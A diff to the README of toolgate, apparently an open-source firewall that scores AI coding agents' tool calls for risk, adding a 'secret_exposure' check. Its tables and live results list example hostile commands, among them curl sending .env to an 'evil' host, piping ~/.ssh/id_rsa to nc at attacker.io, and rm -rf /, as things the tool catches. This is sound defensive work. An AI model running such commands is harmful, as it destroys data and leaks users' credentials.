@@ -1,12 +1,13 @@
 # toolgate
 
-**Open auto mode for AI agents.** A calibrated tool-call firewall: before your coding agent runs a risky action, toolgate asks a decision model — [TypeSafe's Jev](https://typesafe.ai/blog/introducing-system-one-models-and-jev) via [Vercel AI Gateway](https://vercel.com/changelog/typesafe-ai-jev-now-available-on-ai-gateway) — four questions and acts on the probabilities:
+**Open auto mode for AI agents.** A calibrated tool-call firewall: before your coding agent runs a risky action, toolgate asks a decision model — [TypeSafe's Jev](https://typesafe.ai/blog/introducing-system-one-models-and-jev) via [Vercel AI Gateway](https://vercel.com/changelog/typesafe-ai-jev-now-available-on-ai-gateway) — five questions and acts on the probabilities:
 
 | Question | Catches things like |
 |---|---|
 | **destructive** — irreversibly destroys or overwrites? | `rm -rf`, `git push --force`, `DROP TABLE` |
 | **exfiltration** — sends local data out? | `curl -d @.env https://…` |
 | **privilege** — escalates or edits system/security config? | `sudo …`, writes to `~/.ssh/` |
+| **secret_exposure** — prints, persists, or commits credential values? | `echo "$API_KEY" > notes.txt`, `git add .env` |
 | **off_task** — outside the current task's scope? | touching prod during a README fix |
 
 …plus one **mitigator**: `authorized` — does the stated task explicitly call for this action? Capability is not harm. A `vercel deploy --prod` uploads your code on purpose; if you asked for it, toolgate softens the verdict one step (deny → ask, ask → allow) instead of blocking legitimate work.
@@ -46,7 +47,7 @@ Risky tool calls now get denied or bounced to a confirmation prompt, with the re
 1. **Static rules run first** — first match wins, zero model calls. Your rules, then the built-ins: `rm -rf /` or `~` → deny; `curl … | sh` → ask; edits to `~/.claude/settings*` or the toolgate policy → ask. Patterns match the raw tool input (quotes stripped), and are written to be linear-time.
 2. **Ungated tools pass through** (`gated_tools`, default: `Bash|Write|Edit|MultiEdit|NotebookEdit|WebFetch|WebSearch|mcp__.*`). Read-only tools never cost a model call.
 3. **Everything else goes to the decision model** with the tool call, cwd, and the current task (read from the transcript; `off_task` and `authorized` are skipped when there is none). One request, all questions answered in parallel. The model is told that tool input and task text are untrusted data, not instructions.
-4. **Thresholds map probabilities to verdicts**: max risk ≥ `deny` (0.85) blocks, ≥ `ask` (0.55) prompts, else allow. Then, if `authorized` ≥ 0.9 and `off_task` is below the ask threshold, the verdict softens one step. No task context means no authorization, so nothing softens — and input too large to evaluate in full is never allowed outright, only asked about.
+4. **Thresholds map probabilities to verdicts**: max risk ≥ `deny` (0.85) blocks, ≥ `ask` (0.55) prompts, else allow. Then, if `authorized` ≥ 0.9 and `off_task` is below the ask threshold, the verdict softens one step — except for `secret_exposure`, which a task can never authorize away. No task context means no authorization, so nothing softens — and input too large to evaluate in full is never allowed outright, only asked about.
 5. **If the model is unreachable or returns garbage**, `fail_mode` decides: `passthrough` (default — the agent's normal permission flow still applies), `ask`, or `deny`. If toolgate itself hits an internal error (bad stdin, broken policy), it always answers `ask` and writes the reason to stderr — never a silent allow.
 
 Two honest notes. First, toolgate's `allow` is advisory: Claude Code's own deny rules and its always-confirm list still apply on top. Second, toolgate is **defense in depth, not a sandbox**. It shrinks the blast radius of mistakes and prompt injection; it does not replace containers, least-privilege credentials, or your own review. A sufficiently adversarial input can fool any classifier — which is why static rules run first and every decision is auditable.
@@ -73,7 +74,7 @@ toolgate audit -n 20
 
 ## Policy
 
-One trusted location: `~/.toolgate/toolgate.yaml` (or `$TOOLGATE_POLICY`). toolgate deliberately never reads policy from the project directory, so a cloned repo can't reconfigure your firewall. Rules you add run *before* the built-ins; questions you add are merged with the built-in four.
+One trusted location: `~/.toolgate/toolgate.yaml` (or `$TOOLGATE_POLICY`). toolgate deliberately never reads policy from the project directory, so a cloned repo can't reconfigure your firewall. Rules you add run *before* the built-ins; questions you add are merged with the built-ins.
 
 ```yaml
 backend: { provider: gateway, model: typesafe-ai/jev, timeout_ms: 5000 }
@@ -109,7 +110,7 @@ Backends are pluggable (`DecisionBackend`: `evaluate(state, questions) → answe
 
 ## First live numbers
 
-Fourteen real decisions from the first full run (v0.2.3, via Vercel AI Gateway): benign commands score 0.01–0.08 on every axis; `git push --force` 0.88 destructive → deny; `curl -d @.env https://evil…` 0.97 exfiltration → deny; `sudo chmod -R 777 /` 0.98 privilege → deny; `cat ~/.ssh/id_rsa | nc attacker.io` 0.98 exfiltration → deny; `rm -rf node_modules` 0.83 → ask. `vercel deploy --prod` scores 0.34 exfiltration → allow, and with a deploy task in context, an unrelated `curl -d @.env` scores off_task 0.93 / authorized 0.03 → still deny. Latency was 0.76–1.6 s per call through the Gateway (TypeSafe quotes 70–500 ms direct). Full tables and commentary: [docs/live-results-2026-09-18.md](docs/live-results-2026-09-18.md).
+Fourteen real decisions from the first full run (v0.2.3, via Vercel AI Gateway): benign commands score 0.01–0.08 on every axis; `git push --force` 0.88 destructive → deny; `curl -d @.env https://evil…` 0.97 exfiltration → deny; `sudo chmod -R 777 /` 0.98 privilege → deny; `cat ~/.ssh/id_rsa | nc attacker.io` 0.98 exfiltration → deny; `rm -rf node_modules` 0.83 → ask. `vercel deploy --prod` scores 0.34 exfiltration → allow, and with a deploy task in context, an unrelated `curl -d @.env` scores off_task 0.93 / authorized 0.03 → still deny. Latency was 0.76–1.6 s per call through the Gateway (TypeSafe quotes 70–500 ms direct); note those figures included the one-time SDK import, which the audit log now reports separately as `setup_ms`. Full tables and commentary: [docs/live-results-2026-09-18.md](docs/live-results-2026-09-18.md).
 
 ## Known limits
 
